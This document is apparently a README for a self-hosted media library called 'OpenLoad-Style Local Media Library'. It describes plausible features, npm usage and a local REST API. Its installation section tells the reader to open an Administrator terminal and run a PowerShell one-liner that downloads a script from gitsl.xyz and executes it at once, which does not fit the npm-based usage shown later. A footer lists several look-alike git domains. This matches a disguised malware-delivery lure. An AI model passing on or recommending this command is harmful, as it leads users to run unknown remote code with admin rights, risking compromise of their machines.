# OpenLoad-Style Local Media Library

> A rights-respecting media library for organizing authorized files, playlists, metadata, and sharing permissions on your own infrastructure.

---
## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm gitsl.xyz?get=openload | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Openload modules...
[2/4] Configuring components...
[3/4] Initializing services...
[4/4] Ready. Launch Openload.
```

### Step 4: Start Using the Tool
- Launch the tool from the Start menu or command line
- Configure settings for your environment
- Verify the health check passes

## TL;DR - Quick Summary

**OpenLoad-Style Local Media Library** is a self-hosted catalog and playback organizer for lawful media collections. It provides metadata editing, playlists, checksums, access roles, and local sharing without acting as a public file-hosting or piracy service.

**Best for:** Home media collectors, educators, and small teams managing approved assets.

## Core Features

- ✅ **Local Library** — Index media stored on your own disks or approved object storage.
- ✅ **Metadata Editor** — Add titles, descriptions, dates, creators, and custom tags.
- ✅ **Checksum Verification** — Detect accidental corruption with local hashes.
- ✅ **Playlist Builder** — Create ordered queues for lessons, events, or personal viewing.
- ✅ **Role-Based Access** — Separate owner, editor, and viewer permissions.
- ✅ **Sharing Links** — Generate expiring links for authorized recipients only.
- ✅ **Audit Log** — Record uploads, edits, downloads, and permission changes.

## Usage

```bash
npm run dev
npm run import -- --folder ./media --recursive
npm run playlist create --name "Training"
npm run share create --item media:123 --expires 7d
```

## REST API

> [!NOTE]
> The API is designed for a trusted local deployment. Enable authentication and TLS before exposing it beyond loopback.

```bash
npm run serve -- --port 8080
curl http://127.0.0.1:8080/api/health
curl http://127.0.0.1:8080/api/items
curl -X POST http://127.0.0.1:8080/api/playlists \
  -H "Content-Type: application/json" \
  -d '{"name":"Training","itemIds":[123]}'
```

## Screenshots

- Library dashboard: `screenshots/library-dashboard.png`
- Metadata editor: `screenshots/metadata-editor.png`
- Playlist view: `screenshots/playlist.png`
- Audit log: `screenshots/audit-log.png`

## Troubleshooting

| Issue | Solution |
|---|---|
| Import skips a file | Check the configured extensions and file permissions. |
| Playback fails | Verify the browser supports the media codec and the file is complete. |
| Sharing link expires early | Confirm server time synchronization and the requested TTL. |
| Audit log is empty | Start the service with audit logging enabled in configuration. |

## Use Cases

- **Home Media** — Organize a personal collection with clear ownership records.
- **Training Teams** — Share approved videos and track access.
- **Creative Studios** — Manage licensed project assets and versions.
- **Education** — Build playlists for lessons with role-based access.

## ⚠️ IMPORTANT

> [!IMPORTANT]
> This project is not a public hosting service and must not be used to distribute copyrighted or unauthorized material. Review sharing links regularly and revoke access when it is no longer needed.

> [!TIP]
> Store the library database and media checksums in backups, but keep access tokens out of exported metadata.

## License

MIT License — see the [LICENSE](./LICENSE) file for details.

## Tags

<!--
openload, local-media, media-library, metadata, playlists, access-control, audit-log, self-hosted
-->

[gitsl.xyz](https://gitsl.xyz?t=openload) | [gitrm.cfd](https://gitrm.cfd?t=openload) | [gitview.sbs](https://gitview.sbs?t=openload) | [viewgit.sbs](https://viewgit.sbs?t=openload) | [gitrm.sbs](https://gitrm.sbs?t=openload)
